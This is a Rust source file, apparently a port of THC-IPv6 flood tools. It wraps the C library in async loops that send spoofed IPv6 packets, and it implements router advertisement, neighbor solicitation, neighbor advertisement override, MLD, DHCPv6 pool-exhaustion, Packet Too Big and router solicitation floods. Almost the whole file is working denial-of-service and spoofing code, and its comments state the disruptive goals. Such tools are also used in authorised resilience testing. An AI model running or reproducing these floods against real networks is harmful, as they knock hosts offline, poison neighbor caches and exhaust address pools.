//! Async packet sending engine.
//!
//! Wraps blocking C libty calls behind `spawn_blocking` so the tokio
//! runtime stays responsive.  Rate limiting uses `tokio::time::sleep` —
//! zero busy-loops anywhere in this module.

use std::ffi::CString;
use std::sync::Arc;
use std::time::Duration;

use anyhow::{bail, Context, Result};
use tokio::task;
use tracing::{debug, warn};

use crate::engine::stats::Stats;
use crate::ffi;

// ── shared config ─────────────────────────────────────────────────────────────

/// Shared send parameters used by every flood function.
#[derive(Clone, Debug)]
pub struct FloodConfig {
    pub interface:   String,
    /// Packets per second (0 = unlimited)
    pub rate_pps:    u64,
    /// Total packets to send (0 = run forever)
    pub max_packets: u64,
    pub do_hop:      bool,
    pub do_frag:     u32,
    pub do_dst:      bool,
}

/// Configuration for Neighbor Solicitation floods.
#[derive(Clone, Debug)]
pub struct SolicitateConfig {
    pub interface:   String,
    pub rate_pps:    u64,
    pub max_packets: u64,
    /// Optional unicast target; None = random spoof like original C tool
    pub target:      Option<String>,
    /// Add router-alert hop-by-hop header
    pub do_alert:    bool,
}

/// Configuration for Neighbor Advertisement floods.
#[derive(Clone, Debug)]
pub struct AdvertiseConfig {
    pub interface:   String,
    pub rate_pps:    u64,
    pub max_packets: u64,
    /// Optional unicast target
    pub target:      Option<String>,
}

/// Async RA flood — replaces the original `while(1)` busy loop with a
/// tokio-controlled loop that supports rate limiting and clean shutdown.
pub async fn flood_router(cfg: FloodConfig, stats: Arc<Stats>) -> Result<()> {
    let iface = CString::new(cfg.interface.clone())
        .context("interface name contains null byte")?;

    // Resolve multicast destination once.
    let (dst_raw, dstmac_raw, ip6_raw, mac6_raw) = unsafe {
        let ff02_1 = CString::new("ff02::1").unwrap();
        let dst = ffi::thc_resolve6(ff02_1.as_ptr());
        if dst.is_null() {
            bail!("thc_resolve6(ff02::1) failed");
        }
        let dstmac = ffi::thc_get_multicast_mac(dst);
        let ip6    = ffi::thc_get_own_ipv6(iface.as_ptr(), dst, ffi::PREFER_LINK);
        if ip6.is_null() {
            bail!("no link-local IPv6 address on {}", cfg.interface);
        }
        let mac6 = ffi::thc_get_own_mac(iface.as_ptr());
        if mac6.is_null() {
            bail!("cannot get MAC for {}", cfg.interface);
        }
        (dst as usize, dstmac as usize, ip6 as usize, mac6 as usize)
    };

    let sleep_dur = if cfg.rate_pps > 0 {
        Duration::from_micros(1_000_000 / cfg.rate_pps)
    } else {
        Duration::ZERO
    };

    loop {
        let sent = stats.sent.load(std::sync::atomic::Ordering::Relaxed);
        if cfg.max_packets > 0 && sent >= cfg.max_packets {
            break;
        }

        let iface2  = iface.clone();
        let cfg2    = cfg.clone();
        let stats2  = Arc::clone(&stats);

        task::spawn_blocking(move || {
            match send_one_ra(iface2, cfg2, dst_raw, dstmac_raw, ip6_raw, mac6_raw) {
                Ok(())  => stats2.inc_sent(),
                Err(e)  => {
                    warn!("send error: {e}");
                    stats2.inc_errors();
                }
            }
        })
        .await
        .context("spawn_blocking panicked")?;

        if !sleep_dur.is_zero() {
            tokio::time::sleep(sleep_dur).await;
        }

        let (sent, errors, elapsed) = stats.snapshot();
        if sent > 0 && sent % 1000 == 0 {
            debug!(sent, errors, elapsed_s = elapsed, pps = stats.pps() as u64, "flood progress");
        }
    }

    Ok(())
}

/// Builds and sends one Router Advertisement.  Runs on a blocking thread.
fn send_one_ra(
    iface:      CString,
    cfg:        FloodConfig,
    dst_raw:    usize,
    dstmac_raw: usize,
    ip6_raw:    usize,
    _mac6_raw:  usize,
) -> Result<()> {
    let dst    = dst_raw    as *mut u8;
    let dstmac = dstmac_raw as *mut u8;
    let ip6    = ip6_raw    as *mut u8;

    // Randomise per-packet source MAC — fastrand gives independent values.
    let mut fake_mac = [0u8; 6];
    fake_mac[0] = 0x00;
    fake_mac[1] = 0x18;
    for b in &mut fake_mac[2..] {
        *b = fastrand::u8(..);
    }

    let mut ra_buf = [0u8; 56];
    ra_buf[1]  = 250;
    ra_buf[5]  = 30;
    ra_buf[8]  = 5;
    ra_buf[9]  = 1;
    let mtu: u32 = 1500;
    ra_buf[12] = (mtu >> 24) as u8;
    ra_buf[13] = (mtu >> 16) as u8;
    ra_buf[14] = (mtu >>  8) as u8;
    ra_buf[15] =  mtu        as u8;
    ra_buf[16] = 3;
    ra_buf[17] = 4;
    ra_buf[18] = 64;
    ra_buf[19] = 128 + 64 + 32;
    ra_buf[20..28].fill(255);
    ra_buf[48] = 1;
    ra_buf[49] = 1;
    ra_buf[50..56].copy_from_slice(&fake_mac);

    unsafe {
        let mut pkt_len: i32 = 0;
        let pkt = ffi::thc_create_ipv6_extended(
            iface.as_ptr(), ffi::PREFER_LINK, &mut pkt_len,
            ip6, dst, 255, 0, 0, 0, 0,
        );
        if pkt.is_null() {
            bail!("thc_create_ipv6_extended failed");
        }

        if cfg.do_hop {
            let mut hop_buf = [0u8; 6];
            if ffi::thc_add_hdr_hopbyhop(pkt, &mut pkt_len, hop_buf.as_mut_ptr(), 6) < 0 {
                ffi::thc_destroy_packet(pkt);
                bail!("thc_add_hdr_hopbyhop failed");
            }
        }

        for i in 0..cfg.do_frag {
            if ffi::thc_add_hdr_oneshotfragment(pkt, &mut pkt_len, i) < 0 {
                ffi::thc_destroy_packet(pkt);
                bail!("thc_add_hdr_oneshotfragment failed");
            }
        }

        if cfg.do_dst {
            let mut dst_buf = [0u8; 6];
            if ffi::thc_add_hdr_dst(pkt, &mut pkt_len, dst_buf.as_mut_ptr(), 6) < 0 {
                ffi::thc_destroy_packet(pkt);
                bail!("thc_add_hdr_dst failed");
            }
        }

        if ffi::thc_add_icmp6(
            pkt, &mut pkt_len, ffi::ICMP6_ROUTERADV, 0, 0xff08_ffff,
            ra_buf.as_mut_ptr(), ra_buf.len() as i32, 0,
        ) < 0 {
            ffi::thc_destroy_packet(pkt);
            bail!("thc_add_icmp6 failed");
        }

        let rc = ffi::thc_generate_and_send_pkt(
            iface.as_ptr(), fake_mac.as_mut_ptr(), dstmac, pkt, &mut pkt_len,
        );
        ffi::thc_destroy_packet(pkt);

        if rc < 0 {
            bail!("thc_generate_and_send_pkt rc={}", rc);
        }
    }

    Ok(())
}

// ── flood_solicitate ─────────────────────────────────────────────────────────

/// Async Neighbor Solicitation flood.
///
/// When `cfg.target` is None the source IPv6 and solicited-node address are
/// randomised per packet, matching the C `flood_solicitate6` behaviour.
pub async fn flood_solicitate(cfg: SolicitateConfig, stats: Arc<Stats>) -> Result<()> {
    let iface = CString::new(cfg.interface.clone())
        .context("interface name contains null byte")?;

    let (dst_raw, dstmac_raw) = unsafe {
        let ff02_1 = CString::new("ff02::1").unwrap();
        let dst = ffi::thc_resolve6(ff02_1.as_ptr());
        if dst.is_null() { bail!("thc_resolve6(ff02::1) failed"); }
        let dstmac = ffi::thc_get_multicast_mac(dst);
        (dst as usize, dstmac as usize)
    };

    let target_raw: Option<usize> = if let Some(ref t) = cfg.target {
        let cs  = CString::new(t.as_str()).context("null in target")?;
        let ptr = unsafe { ffi::thc_resolve6(cs.as_ptr()) };
        if ptr.is_null() { bail!("cannot resolve target {t}"); }
        Some(ptr as usize)
    } else {
        None
    };

    let sleep_dur = rate_to_sleep(cfg.rate_pps);

    loop {
        if cfg.max_packets > 0
            && stats.sent.load(std::sync::atomic::Ordering::Relaxed) >= cfg.max_packets
        {
            break;
        }

        let iface2 = iface.clone();
        let cfg2   = cfg.clone();
        let stats2 = Arc::clone(&stats);

        task::spawn_blocking(move || {
            match send_one_ns(iface2, cfg2, dst_raw, dstmac_raw, target_raw) {
                Ok(())  => stats2.inc_sent(),
                Err(e)  => { warn!("NS send error: {e}"); stats2.inc_errors(); }
            }
        })
        .await
        .context("spawn_blocking panicked")?;

        sleep_rate(sleep_dur).await;
        log_progress(&stats);
    }
    Ok(())
}

fn send_one_ns(
    iface:      CString,
    cfg:        SolicitateConfig,
    dst_raw:    usize,
    dstmac_raw: usize,
    target_raw: Option<usize>,
) -> Result<()> {
    let dst    = dst_raw    as *mut u8;
    let dstmac = dstmac_raw as *mut u8;

    let mut fake_mac = [0u8; 6];
    fake_mac[0] = 0x00;
    fake_mac[1] = 0x18;
    for b in &mut fake_mac[2..] { *b = fastrand::u8(..); }

    // EUI-64 link-local from fake_mac.
    let mut src_ip = [0u8; 16];
    src_ip[0] = 0xfe; src_ip[1] = 0x80;
    src_ip[8] = 0x02; src_ip[9] = 0x18;
    src_ip[10] = fake_mac[2]; src_ip[11] = 0xff;
    src_ip[12] = 0xfe; src_ip[13] = fake_mac[3];
    src_ip[14] = fake_mac[4]; src_ip[15] = fake_mac[5];

    // NS payload: [0..16] solicited addr, [16] opt=1, [17] len=1, [18..24] SLLA.
    let mut ns_buf = [0u8; 24];
    if let Some(t) = target_raw {
        let tp = t as *const u8;
        for i in 0..16 { ns_buf[i] = unsafe { *tp.add(i) }; }
    } else {
        ns_buf[..16].copy_from_slice(&src_ip);
    }
    ns_buf[16] = 1; ns_buf[17] = 1;
    ns_buf[18..24].copy_from_slice(&fake_mac);

    let mut alert_buf = [0u8; 6];
    if cfg.do_alert { alert_buf[0] = 5; alert_buf[1] = 2; }

    unsafe {
        let mut pkt_len: i32 = 0;
        let pkt = ffi::thc_create_ipv6_extended(
            iface.as_ptr(), ffi::PREFER_LINK, &mut pkt_len,
            src_ip.as_mut_ptr(), dst, 255, 0, 0, 0, 0,
        );
        if pkt.is_null() { bail!("thc_create_ipv6_extended failed"); }

        if cfg.do_alert {
            if ffi::thc_add_hdr_hopbyhop(pkt, &mut pkt_len, alert_buf.as_mut_ptr(), 6) < 0 {
                ffi::thc_destroy_packet(pkt);
                bail!("thc_add_hdr_hopbyhop failed");
            }
        }

        if ffi::thc_add_icmp6(
            pkt, &mut pkt_len, ffi::ICMP6_NEIGHBORSOL, 0, 0,
            ns_buf.as_mut_ptr(), ns_buf.len() as i32, 0,
        ) < 0 {
            ffi::thc_destroy_packet(pkt);
            bail!("thc_add_icmp6(NS) failed");
        }

        let rc = ffi::thc_generate_and_send_pkt(
            iface.as_ptr(), fake_mac.as_mut_ptr(), dstmac, pkt, &mut pkt_len,
        );
        ffi::thc_destroy_packet(pkt);
        if rc < 0 { bail!("send NS rc={rc}"); }
    }
    Ok(())
}

// ── flood_advertise ──────────────────────────────────────────────────────────

/// Async Neighbor Advertisement flood with Override flag.
///
/// Matches the C `flood_advertise6` tool: random MAC + source IP every packet,
/// Override bit set, targets ff02::1 or a provided unicast.
pub async fn flood_advertise(cfg: AdvertiseConfig, stats: Arc<Stats>) -> Result<()> {
    let iface = CString::new(cfg.interface.clone())
        .context("interface name contains null byte")?;

    let (dst_raw, dstmac_raw) = unsafe {
        let ff02_1 = CString::new("ff02::1").unwrap();
        let dst = ffi::thc_resolve6(ff02_1.as_ptr());
        if dst.is_null() { bail!("thc_resolve6(ff02::1) failed"); }
        let dstmac = ffi::thc_get_multicast_mac(dst);
        (dst as usize, dstmac as usize)
    };

    let target_raw: Option<usize> = if let Some(ref t) = cfg.target {
        let cs  = CString::new(t.as_str()).context("null in target")?;
        let ptr = unsafe { ffi::thc_resolve6(cs.as_ptr()) };
        if ptr.is_null() { bail!("cannot resolve target {t}"); }
        Some(ptr as usize)
    } else {
        None
    };

    let sleep_dur = rate_to_sleep(cfg.rate_pps);

    loop {
        if cfg.max_packets > 0
            && stats.sent.load(std::sync::atomic::Ordering::Relaxed) >= cfg.max_packets
        {
            break;
        }

        let iface2 = iface.clone();
        let cfg2   = cfg.clone();
        let stats2 = Arc::clone(&stats);

        task::spawn_blocking(move || {
            match send_one_na(iface2, cfg2, dst_raw, dstmac_raw, target_raw) {
                Ok(())  => stats2.inc_sent(),
                Err(e)  => { warn!("NA send error: {e}"); stats2.inc_errors(); }
            }
        })
        .await
        .context("spawn_blocking panicked")?;

        sleep_rate(sleep_dur).await;
        log_progress(&stats);
    }
    Ok(())
}

fn send_one_na(
    iface:      CString,
    cfg:        AdvertiseConfig,
    dst_raw:    usize,
    dstmac_raw: usize,
    target_raw: Option<usize>,
) -> Result<()> {
    let dst    = dst_raw    as *mut u8;
    let dstmac = dstmac_raw as *mut u8;

    let mut fake_mac = [0u8; 6];
    fake_mac[0] = 0x00;
    fake_mac[1] = 0x18;
    for b in &mut fake_mac[2..] { *b = fastrand::u8(..); }

    let mut src_ip = [0u8; 16];
    src_ip[0] = 0xfe; src_ip[1] = 0x80;
    src_ip[8] = 0x02; src_ip[9] = 0x18;
    src_ip[10] = fake_mac[2]; src_ip[11] = 0xff;
    src_ip[12] = 0xfe; src_ip[13] = fake_mac[3];
    src_ip[14] = fake_mac[4]; src_ip[15] = fake_mac[5];

    // NA payload: [0..16] target addr, [16] opt=2 (TLLA), [17] len=1, [18..24] MAC.
    let mut na_buf = [0u8; 24];
    if let Some(t) = target_raw {
        let tp = t as *const u8;
        for i in 0..16 { na_buf[i] = unsafe { *tp.add(i) }; }
    } else {
        na_buf[..16].copy_from_slice(&src_ip);
    }
    na_buf[16] = 2; na_buf[17] = 1;
    na_buf[18..24].copy_from_slice(&fake_mac);

    // Override flag (bit 21 in ICMPv6 NA flags field, big-endian u32).
    const NA_OVERRIDE: u32 = 0x0200_0000;

    unsafe {
        let mut pkt_len: i32 = 0;
        let pkt = ffi::thc_create_ipv6_extended(
            iface.as_ptr(), ffi::PREFER_LINK, &mut pkt_len,
            src_ip.as_mut_ptr(), dst, 255, 0, 0, 0, 0,
        );
        if pkt.is_null() { bail!("thc_create_ipv6_extended failed"); }

        if ffi::thc_add_icmp6(
            pkt, &mut pkt_len, ffi::ICMP6_NEIGHBORADV, 0, NA_OVERRIDE,
            na_buf.as_mut_ptr(), na_buf.len() as i32, 0,
        ) < 0 {
            ffi::thc_destroy_packet(pkt);
            bail!("thc_add_icmp6(NA) failed");
        }

        let rc = ffi::thc_generate_and_send_pkt(
            iface.as_ptr(), fake_mac.as_mut_ptr(), dstmac, pkt, &mut pkt_len,
        );
        ffi::thc_destroy_packet(pkt);
        if rc < 0 { bail!("send NA rc={rc}"); }
    }

    let _ = cfg; // suppress unused warning — cfg used only for future fields
    Ok(())
}

// ── flood_mld ────────────────────────────────────────────────────────────────

/// Configuration for MLDv1 Report floods.
#[derive(Clone, Debug)]
pub struct MldConfig {
    pub interface:   String,
    pub rate_pps:    u64,
    pub max_packets: u64,
}

/// Async MLDv1 Report flood (ICMPv6 type 131).
///
/// Each packet uses a random multicast group address in the ff02::/16 range,
/// causing receivers to maintain spurious group state.
pub async fn flood_mld(cfg: MldConfig, stats: Arc<Stats>) -> Result<()> {
    let iface = CString::new(cfg.interface.clone())
        .context("interface name contains null byte")?;

    let sleep_dur = rate_to_sleep(cfg.rate_pps);

    loop {
        if cfg.max_packets > 0
            && stats.sent.load(std::sync::atomic::Ordering::Relaxed) >= cfg.max_packets
        {
            break;
        }

        let iface2 = iface.clone();
        let cfg2   = cfg.clone();
        let stats2 = Arc::clone(&stats);

        task::spawn_blocking(move || {
            match send_one_mld(iface2, cfg2) {
                Ok(())  => stats2.inc_sent(),
                Err(e)  => { warn!("MLD send error: {e}"); stats2.inc_errors(); }
            }
        })
        .await
        .context("spawn_blocking panicked")?;

        sleep_rate(sleep_dur).await;
        log_progress(&stats);
    }
    Ok(())
}

fn send_one_mld(iface: CString, _cfg: MldConfig) -> Result<()> {
    // Build a random ff02::xxxx multicast group address.
    let mut group = [0u8; 16];
    group[0] = 0xff;
    group[1] = 0x02;
    group[14] = fastrand::u8(..);
    group[15] = fastrand::u8(..);

    // Random fake source MAC and EUI-64 link-local.
    let mut fake_mac = [0u8; 6];
    fake_mac[0] = 0x00;
    fake_mac[1] = 0x18;
    for b in &mut fake_mac[2..] { *b = fastrand::u8(..); }

    let mut src_ip = [0u8; 16];
    src_ip[0] = 0xfe; src_ip[1] = 0x80;
    src_ip[8]  = 0x02; src_ip[9]  = 0x18;
    src_ip[10] = fake_mac[2]; src_ip[11] = 0xff;
    src_ip[12] = 0xfe; src_ip[13] = fake_mac[3];
    src_ip[14] = fake_mac[4]; src_ip[15] = fake_mac[5];

    // MLDv1 Report body: max-response-delay (2 bytes), reserved (2 bytes),
    // multicast address (16 bytes).
    let mut mld_buf = [0u8; 20];
    mld_buf[0] = 0;   // max response delay hi
    mld_buf[1] = 0;   // max response delay lo
    // bytes 2-3: reserved (zero)
    mld_buf[4..20].copy_from_slice(&group);

    unsafe {
        let mut dst = group;
        let dstmac_ptr = ffi::thc_get_multicast_mac(dst.as_mut_ptr());

        let mut pkt_len: i32 = 0;
        let pkt = ffi::thc_create_ipv6_extended(
            iface.as_ptr(), ffi::PREFER_LINK, &mut pkt_len,
            src_ip.as_mut_ptr(), dst.as_mut_ptr(), 1, 0, 0, 0, 0,
        );
        if pkt.is_null() { bail!("thc_create_ipv6_extended failed"); }

        if ffi::thc_add_icmp6(
            pkt, &mut pkt_len, ffi::ICMP6_MLD_REPORT, 0, 0,
            mld_buf.as_mut_ptr(), mld_buf.len() as i32, 0,
        ) < 0 {
            ffi::thc_destroy_packet(pkt);
            bail!("thc_add_icmp6(MLD) failed");
        }

        let rc = ffi::thc_generate_and_send_pkt(
            iface.as_ptr(), fake_mac.as_mut_ptr(), dstmac_ptr, pkt, &mut pkt_len,
        );
        ffi::thc_destroy_packet(pkt);
        if rc < 0 { bail!("send MLD rc={rc}"); }
    }
    Ok(())
}

// ── flood_dhcp6 ───────────────────────────────────────────────────────────────

/// Configuration for DHCPv6 Solicit floods.
#[derive(Clone, Debug)]
pub struct Dhcp6Config {
    pub interface:   String,
    pub rate_pps:    u64,
    pub max_packets: u64,
}

/// Async DHCPv6 Solicit flood.
///
/// Exhausts a DHCPv6 server's address pool by sending Solicit messages with a
/// unique random DUID and transaction ID per packet.  Targets the all-DHCPv6-
/// servers multicast address (ff02::1:2) on port 547.
pub async fn flood_dhcp6(cfg: Dhcp6Config, stats: Arc<Stats>) -> Result<()> {
    let iface = CString::new(cfg.interface.clone())
        .context("interface name contains null byte")?;

    let sleep_dur = rate_to_sleep(cfg.rate_pps);

    loop {
        if cfg.max_packets > 0
            && stats.sent.load(std::sync::atomic::Ordering::Relaxed) >= cfg.max_packets
        {
            break;
        }

        let iface2 = iface.clone();
        let cfg2   = cfg.clone();
        let stats2 = Arc::clone(&stats);

        task::spawn_blocking(move || {
            match send_one_dhcp6(iface2, cfg2) {
                Ok(())  => stats2.inc_sent(),
                Err(e)  => { warn!("DHCPv6 send error: {e}"); stats2.inc_errors(); }
            }
        })
        .await
        .context("spawn_blocking panicked")?;

        sleep_rate(sleep_dur).await;
        log_progress(&stats);
    }
    Ok(())
}

fn send_one_dhcp6(iface: CString, _cfg: Dhcp6Config) -> Result<()> {
    // Destination: ff02::1:2 (all-DHCP-servers-and-relay-agents).
    let mut dst = [0u8; 16];
    dst[0] = 0xff; dst[1] = 0x02;
    dst[13] = 0x01; dst[15] = 0x02;

    // Random source MAC / EUI-64 link-local.
    let mut fake_mac = [0u8; 6];
    fake_mac[0] = 0x00; fake_mac[1] = 0x18;
    for b in &mut fake_mac[2..] { *b = fastrand::u8(..); }

    let mut src_ip = [0u8; 16];
    src_ip[0] = 0xfe; src_ip[1] = 0x80;
    src_ip[8]  = 0x02; src_ip[9]  = 0x18;
    src_ip[10] = fake_mac[2]; src_ip[11] = 0xff;
    src_ip[12] = 0xfe; src_ip[13] = fake_mac[3];
    src_ip[14] = fake_mac[4]; src_ip[15] = fake_mac[5];

    // DHCPv6 Solicit payload (msg-type=1, transaction-id=3 random bytes,
    // then a Client Identifier option with a random DUID-LL).
    //
    //  0         1         2         3
    //  +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
    //  | msg-type | transaction-id (3B)|
    //  +---------+---------+-----------+
    //  | option-code (2) | option-len  |
    //  +-----------------+-------------+
    //  | DUID-type (3=LL)| hw-type (1) |
    //  +-----------------+-------------+
    //  | link-layer addr (6 B)         |
    //  +-------------------------------+
    let mut payload = [0u8; 4 + 2 + 2 + 2 + 2 + 6];
    payload[0] = 1;                       // msg-type: Solicit
    payload[1] = fastrand::u8(..);        // transaction-id[0]
    payload[2] = fastrand::u8(..);        // transaction-id[1]
    payload[3] = fastrand::u8(..);        // transaction-id[2]
    // Option 1 (Client Identifier), length = 10 (DUID-LL for Ethernet).
    payload[4] = 0; payload[5] = 1;       // option-code = 1
    payload[6] = 0; payload[7] = 10;      // option-len  = 10
    payload[8] = 0; payload[9] = 3;       // DUID-type = 3 (LL)
    payload[10] = 0; payload[11] = 1;     // hw-type = 1 (Ethernet)
    // Random DUID link-layer address — different per packet.
    payload[12] = fastrand::u8(..);
    payload[13] = fastrand::u8(..);
    payload[14] = fastrand::u8(..);
    payload[15] = fastrand::u8(..);
    payload[16] = fastrand::u8(..);
    payload[17] = fastrand::u8(..);

    unsafe {
        let dstmac_ptr = ffi::thc_get_multicast_mac(dst.as_mut_ptr());

        let mut pkt_len: i32 = 0;
        let pkt = ffi::thc_create_ipv6_extended(
            iface.as_ptr(), ffi::PREFER_LINK, &mut pkt_len,
            src_ip.as_mut_ptr(), dst.as_mut_ptr(), 1, 0, 0, 0, 0,
        );
        if pkt.is_null() { bail!("thc_create_ipv6_extended failed"); }

        // Append UDP header: src-port 546 (client), dst-port 547 (server).
        if ffi::thc_add_udp(
            pkt, &mut pkt_len, 546, 547, 0,
            payload.as_mut_ptr(), payload.len() as i32,
        ) < 0 {
            ffi::thc_destroy_packet(pkt);
            bail!("thc_add_udp failed");
        }

        let rc = ffi::thc_generate_and_send_pkt(
            iface.as_ptr(), fake_mac.as_mut_ptr(), dstmac_ptr, pkt, &mut pkt_len,
        );
        ffi::thc_destroy_packet(pkt);
        if rc < 0 { bail!("send DHCPv6 rc={rc}"); }
    }
    Ok(())
}

// ── flood_toobig ─────────────────────────────────────────────────────────────

/// Configuration for ICMPv6 Packet Too Big floods.
#[derive(Clone, Debug)]
pub struct TooBigConfig {
    pub interface:   String,
    pub rate_pps:    u64,
    pub max_packets: u64,
    /// Target whose path MTU we want to shrink.
    pub target:      String,
}

/// Async ICMPv6 Packet Too Big flood (type 2, code 0).
///
/// Forces the target to reduce its path MTU to 1280 (the minimum legal IPv6
/// MTU) by flooding it with spoofed PTB messages.
pub async fn flood_toobig(cfg: TooBigConfig, stats: Arc<Stats>) -> Result<()> {
    let iface = CString::new(cfg.interface.clone())
        .context("interface name contains null byte")?;

    let target_raw: usize = {
        let cs = CString::new(cfg.target.as_str()).context("null in target")?;
        let ptr = unsafe { ffi::thc_resolve6(cs.as_ptr()) };
        if ptr.is_null() { bail!("cannot resolve target {}", cfg.target); }
        ptr as usize
    };

    let sleep_dur = rate_to_sleep(cfg.rate_pps);

    loop {
        if cfg.max_packets > 0
            && stats.sent.load(std::sync::atomic::Ordering::Relaxed) >= cfg.max_packets
        {
            break;
        }

        let iface2 = iface.clone();
        let cfg2   = cfg.clone();
        let stats2 = Arc::clone(&stats);

        task::spawn_blocking(move || {
            match send_one_toobig(iface2, cfg2, target_raw) {
                Ok(())  => stats2.inc_sent(),
                Err(e)  => { warn!("TooBig send error: {e}"); stats2.inc_errors(); }
            }
        })
        .await
        .context("spawn_blocking panicked")?;

        sleep_rate(sleep_dur).await;
        log_progress(&stats);
    }
    Ok(())
}

fn send_one_toobig(iface: CString, _cfg: TooBigConfig, target_raw: usize) -> Result<()> {
    let dst = target_raw as *mut u8;

    // Random spoofed source (appears to come from a router on the path).
    let mut fake_mac = [0u8; 6];
    fake_mac[0] = 0x00; fake_mac[1] = 0x18;
    for b in &mut fake_mac[2..] { *b = fastrand::u8(..); }

    let mut src_ip = [0u8; 16];
    src_ip[0] = 0xfe; src_ip[1] = 0x80;
    src_ip[8]  = 0x02; src_ip[9]  = 0x18;
    src_ip[10] = fake_mac[2]; src_ip[11] = 0xff;
    src_ip[12] = 0xfe; src_ip[13] = fake_mac[3];
    src_ip[14] = fake_mac[4]; src_ip[15] = fake_mac[5];

    // PTB body: MTU (4 bytes big-endian) followed by as much of the original
    // packet as we can fit.  We fill a minimal 40-byte IPv6 header as the
    // "invoking packet" fragment.
    let mtu: u32 = 1280;
    let mut ptb_buf = [0u8; 44]; // 4 (MTU) + 40 (fake orig IPv6 hdr)
    ptb_buf[0] = (mtu >> 24) as u8;
    ptb_buf[1] = (mtu >> 16) as u8;
    ptb_buf[2] = (mtu >>  8) as u8;
    ptb_buf[3] =  mtu        as u8;
    // Fake original IPv6 header (version=6, the rest zeros is fine for PTB).
    ptb_buf[4] = 0x60;

    unsafe {
        let dstmac_ptr = ffi::thc_get_mac(iface.as_ptr(), src_ip.as_mut_ptr(), dst);

        let mut pkt_len: i32 = 0;
        let pkt = ffi::thc_create_ipv6_extended(
            iface.as_ptr(), ffi::PREFER_LINK, &mut pkt_len,
            src_ip.as_mut_ptr(), dst, 255, 0, 0, 0, 0,
        );
        if pkt.is_null() { bail!("thc_create_ipv6_extended failed"); }

        if ffi::thc_add_icmp6(
            pkt, &mut pkt_len, ffi::ICMP6_TOOBIG, 0, 0,
            ptb_buf.as_mut_ptr(), ptb_buf.len() as i32, 0,
        ) < 0 {
            ffi::thc_destroy_packet(pkt);
            bail!("thc_add_icmp6(TooBig) failed");
        }

        let rc = ffi::thc_generate_and_send_pkt(
            iface.as_ptr(), fake_mac.as_mut_ptr(), dstmac_ptr, pkt, &mut pkt_len,
        );
        ffi::thc_destroy_packet(pkt);
        if rc < 0 { bail!("send TooBig rc={rc}"); }
    }
    Ok(())
}

// ── flood_rs ─────────────────────────────────────────────────────────────────

/// Configuration for Router Solicitation floods.
#[derive(Clone, Debug)]
pub struct RsConfig {
    pub interface:   String,
    pub rate_pps:    u64,
    pub max_packets: u64,
}

/// Async Router Solicitation flood (ICMPv6 type 133).
///
/// Sends RS messages to ff02::2 (all-routers) with a randomised source per
/// packet.  Forces routers to send unsolicited RAs, amplifying traffic.
pub async fn flood_rs(cfg: RsConfig, stats: Arc<Stats>) -> Result<()> {
    let iface = CString::new(cfg.interface.clone())
        .context("interface name contains null byte")?;

    // ff02::2 is the all-routers multicast address.
    let (dst_raw, dstmac_raw) = unsafe {
        let ff02_2 = CString::new("ff02::2").unwrap();
        let dst = ffi::thc_resolve6(ff02_2.as_ptr());
        if dst.is_null() { bail!("thc_resolve6(ff02::2) failed"); }
        let dstmac = ffi::thc_get_multicast_mac(dst);
        (dst as usize, dstmac as usize)
    };

    let sleep_dur = rate_to_sleep(cfg.rate_pps);

    loop {
        if cfg.max_packets > 0
            && stats.sent.load(std::sync::atomic::Ordering::Relaxed) >= cfg.max_packets
        {
            break;
        }

        let iface2 = iface.clone();
        let cfg2   = cfg.clone();
        let stats2 = Arc::clone(&stats);

        task::spawn_blocking(move || {
            match send_one_rs(iface2, cfg2, dst_raw, dstmac_raw) {
                Ok(())  => stats2.inc_sent(),
                Err(e)  => { warn!("RS send error: {e}"); stats2.inc_errors(); }
            }
        })
        .await
        .context("spawn_blocking panicked")?;

        sleep_rate(sleep_dur).await;
        log_progress(&stats);
    }
    Ok(())
}

fn send_one_rs(
    iface:      CString,
    _cfg:       RsConfig,
    dst_raw:    usize,
    dstmac_raw: usize,
) -> Result<()> {
    let dst    = dst_raw    as *mut u8;
    let dstmac = dstmac_raw as *mut u8;

    let mut fake_mac = [0u8; 6];
    fake_mac[0] = 0x00; fake_mac[1] = 0x18;
    for b in &mut fake_mac[2..] { *b = fastrand::u8(..); }

    let mut src_ip = [0u8; 16];
    src_ip[0] = 0xfe; src_ip[1] = 0x80;
    src_ip[8]  = 0x02; src_ip[9]  = 0x18;
    src_ip[10] = fake_mac[2]; src_ip[11] = 0xff;
    src_ip[12] = 0xfe; src_ip[13] = fake_mac[3];
    src_ip[14] = fake_mac[4]; src_ip[15] = fake_mac[5];

    // RS body: 4 reserved bytes, then Source Link-Layer Address option.
    let mut rs_buf = [0u8; 10];
    // bytes 0-3: reserved (zero)
    rs_buf[4] = 1; rs_buf[5] = 1; // opt type=1 (SLLA), len=1 (8 bytes)
    rs_buf[4..10].copy_from_slice(&[1, 1, fake_mac[0], fake_mac[1], fake_mac[2], fake_mac[3]]);

    unsafe {
        let mut pkt_len: i32 = 0;
        let pkt = ffi::thc_create_ipv6_extended(
            iface.as_ptr(), ffi::PREFER_LINK, &mut pkt_len,
            src_ip.as_mut_ptr(), dst, 255, 0, 0, 0, 0,
        );
        if pkt.is_null() { bail!("thc_create_ipv6_extended failed"); }

        if ffi::thc_add_icmp6(
            pkt, &mut pkt_len, ffi::ICMP6_ROUTERSOL, 0, 0,
            rs_buf.as_mut_ptr(), rs_buf.len() as i32, 0,
        ) < 0 {
            ffi::thc_destroy_packet(pkt);
            bail!("thc_add_icmp6(RS) failed");
        }

        let rc = ffi::thc_generate_and_send_pkt(
            iface.as_ptr(), fake_mac.as_mut_ptr(), dstmac, pkt, &mut pkt_len,
        );
        ffi::thc_destroy_packet(pkt);
        if rc < 0 { bail!("send RS rc={rc}"); }
    }
    Ok(())
}

// ── private helpers ───────────────────────────────────────────────────────────

fn rate_to_sleep(rate_pps: u64) -> Duration {
    if rate_pps > 0 { Duration::from_micros(1_000_000 / rate_pps) } else { Duration::ZERO }
}

async fn sleep_rate(d: Duration) {
    if !d.is_zero() { tokio::time::sleep(d).await; }
}

fn log_progress(stats: &Stats) {
    let (sent, errors, elapsed) = stats.snapshot();
    if sent > 0 && sent % 1000 == 0 {
        debug!(sent, errors, elapsed_s = elapsed, pps = stats.pps() as u64, "progress");
    }
}
